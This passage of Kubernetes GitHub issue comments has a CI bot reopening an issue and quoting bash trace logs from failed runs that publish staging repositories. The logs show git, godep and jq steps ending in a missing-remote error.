Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiserver/\") or . == \"k8s.io/apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/kube-controller-manager/\") or . == \"k8s.io/kube-controller-manager\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:release-1.12,apiserver:release-1.12\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ '[' -z 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ']'\n>\t++ git-find-merge 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '30b0b2d36c9719ec02a6a0414db2ddc802b040e7^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 30b0b2d36c9719ec02a6a0414db2ddc802b040e7..upstream-branch --ancestry-path\n>\t+++ git rev-parse 30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ local k_last_kube_merge=30b0b2d36c9719ec02a6a0414db2ddc802b040e7\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.\n>\t++ look -b 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ../kube-commits-apimachinery-release-1.12\n>\t+ '[' -z 3b307a310a061fc549c8801bfe72ea3d30948920 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to 3b307a310a061fc549c8801bfe72ea3d30948920'\n>\tChecking out k8s.io/apimachinery to 3b307a310a061fc549c8801bfe72ea3d30948920\n>\t+ git checkout -q 3b307a310a061fc549c8801bfe72ea3d30948920\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\tLooking up which commit in the release-1.12 branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.\n>\t+ local dep=apiserver\n>\t+ local branch=release-1.12\n>\t+ echo 'Looking up which commit in the release-1.12 branch of k8s.io/apiserver corresponds to k8s.io/kubernetes commit 30b0b2d36c9719ec02a6a0414db2ddc802b040e7.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 30b0b2d36c9719ec02a6a0414db2ddc802b040e7 ../kube-commits-apiserver-release-1.12\n>\t+ '[' -z 6287f470a5b62c40cf4882df1a8ca148fd687cb3 ']'\n>\t+ pushd ../apiserver\n>\tChecking out k8s.io/apiserver to 6287f470a5b62c40cf4882df1a8ca148fd687cb3\n>\t+ echo 'Checking out k8s.io/apiserver to 6287f470a5b62c40cf4882df1a8ca148fd687cb3'\n>\t+ git checkout -q 6287f470a5b62c40cf4882df1a8ca148fd687cb3\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ echo 'Removing complete vendor/ on non-master branch because this is a library.'\n>\t+ rm -rf vendor/\n>\tRemoving complete vendor/ on non-master branch because this is a library.\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ true\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\tGodeps.json hasn't changed!\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.12 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code e859f217aca987cf1ce6d08066a14a8e80d44d59\n>\tRemove redundant godep commits on-top of e859f217aca987cf1ce6d08066a14a8e80d44d59.\n>\t+ echo 'Remove redundant godep commits on-top of e859f217aca987cf1ce6d08066a14a8e80d44d59.'\n>\t+ git reset --soft -q e859f217aca987cf1ce6d08066a14a8e80d44d59\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/kube-controller-manager\n>\t+ local repo=kube-controller-manager\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'e859f21 Merge remote-tracking branch '\\''origin/master'\\'' into release-1.12' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-kube-controller-manager-release-1.12'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-kube-controller-manager-release-1.12\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=e859f217aca987cf1ce6d08066a14a8e80d44d59\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-controller-manager-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-controller-manager-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-kube-controller-manager-release-1.12.sh --dependencies apimachinery:release-1.12,apiserver:release-1.12 -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"origin\".\n>\tFetching tags from remote \"upstream\".\n>\tComputing mapping from kube commits to the local branch.\n>\t++ git rev-parse release-1.12\n>\t+ '[' e859f217aca987cf1ce6d08066a14a8e80d44d59 '!=' e859f217aca987cf1ce6d08066a14a8e80d44d59 ']'\n>\t+ git checkout release-1.12\n>\tAlready on 'release-1.12'\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>[09 Sep 18 09:57 UTC]: Successfully constructed release-1.12\n>[09 Sep 18 09:57 UTC]: /publish_scripts/push.sh /etc/secret-volume/token master\n>\tEverything up-to-date\n>[09 Sep 18 09:57 UTC]: no upstream branch \"master\" found```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-419730946):\n\n>/reopen\n>\n>The last publishing run failed: exit status 1\n>```\n>[09 Sep 18 17:21 UTC]: Successfully ensured /go-workspace/src/k8s.io/code-generator exists\n>[09 Sep 18 17:21 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Sep 18 17:21 UTC]: /publish_scripts/construct.sh code-generator master master   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  8d1127cb41c9394a437e09728a25a3dcf4a4cadf\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=8d1127cb41c9394a437e09728a25a3dcf4a4cadf\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 3dcf91f64f638563e5106f21f50c31fa361c918d\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote update upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\tfatal: No such remote or remote group: /go-workspace/src/k8s.io/kubernetes/.git\n>[09 Sep 18 17:21 UTC]: exit status 1\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=code-generator\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/code-generator\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=false\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=8d1127cb41c9394a437e09728a25a3dcf4a4cadf\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 3dcf91f64f638563e5106f21f50c31fa361c918d\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote update upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \tfatal: No such remote or remote group: /go-workspace/src/k8s.io/kubernetes/.git\n>\n>[09 Sep 18 17:21 UTC]: exit status 1```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-419744843):\n\n>/reopen\n>\n>The last publishing run failed: exit status 2\n>```\n>[09 Sep 18 21:01 UTC]: Successfully ensured /go-workspace/src/k8s.io/code-generator exists\n>[09 Sep 18 21:01 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Sep 18 21:01 UTC]: /publish_scripts/construct.sh code-generator master master   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  64d3282ec646f1f850f37c03336d73d1e836f226\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=64d3282ec646f1f850f37c03336d73d1e836f226\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q a4df698a96cf14cb8783233b5b95635e2edf002e\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=a4df698a96cf14cb8783233b5b95635e2edf002e\n>\t+ '[' a4df698a96cf14cb8783233b5b95635e2edf002e '!=' 64d3282ec646f1f850f37c03336d73d1e836f226 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''64d3282ec646f1f850f37c03336d73d1e836f226'\\'' to '\\''a4df698a96cf14cb8783233b5b95635e2edf002e'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from '64d3282ec646f1f850f37c03336d73d1e836f226' to 'a4df698a96cf14cb8783233b5b95635e2edf002e'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator master master '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\taae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 15 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit aae79feb89bdded3679da91fd8c19b6dfcbdb79a.\n>\t+ echo 'Starting at existing master commit aae79feb89bdded3679da91fd8c19b6dfcbdb79a.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit a4df698a96cf14cb8783233b5b95635e2edf002e.\n>\t+ echo 'Checked out source commit a4df698a96cf14cb8783233b5b95635e2edf002e.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>\t+ '[' -z b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb ']'\n>\t++ git-find-merge b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb upstream/master\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb^1..upstream/master' --first-parent\n>\t+++ git rev-list b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb..upstream/master --ancestry-path\n>\t+++ git rev-parse b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>\t+ local k_base_merge=b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>\t+ '[' -z b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb ']'\n>\t+ git branch -f filtered-branch-base b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/code-generator.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/code-generator.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\tRunning git filter-branch ...\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=0aecd14c539d69150c5c4b198ea78c7993e17a37\n>\t++ git log --first-parent --format=%H --reverse 0aecd14c539d69150c5c4b198ea78c7993e17a37..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' aae79feb89bdded3679da91fd8c19b6dfcbdb79a '!=' aae79feb89bdded3679da91fd8c19b6dfcbdb79a ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps '' '' k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>\t+ local deps=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit ''\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ grep '^Kubernetes-commit: '\n>\t++ git log --format=%B HEAD\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>\t+ '[' -z b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb ']'\n>\t++ git-find-merge b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 'b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb..upstream-branch --ancestry-path\n>\t+++ git rev-parse b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>\t+ local k_last_kube_merge=b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>\t+ local dep_count=0\n>\t+ (( i=0 ))\n>\t+ (( i<0 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv 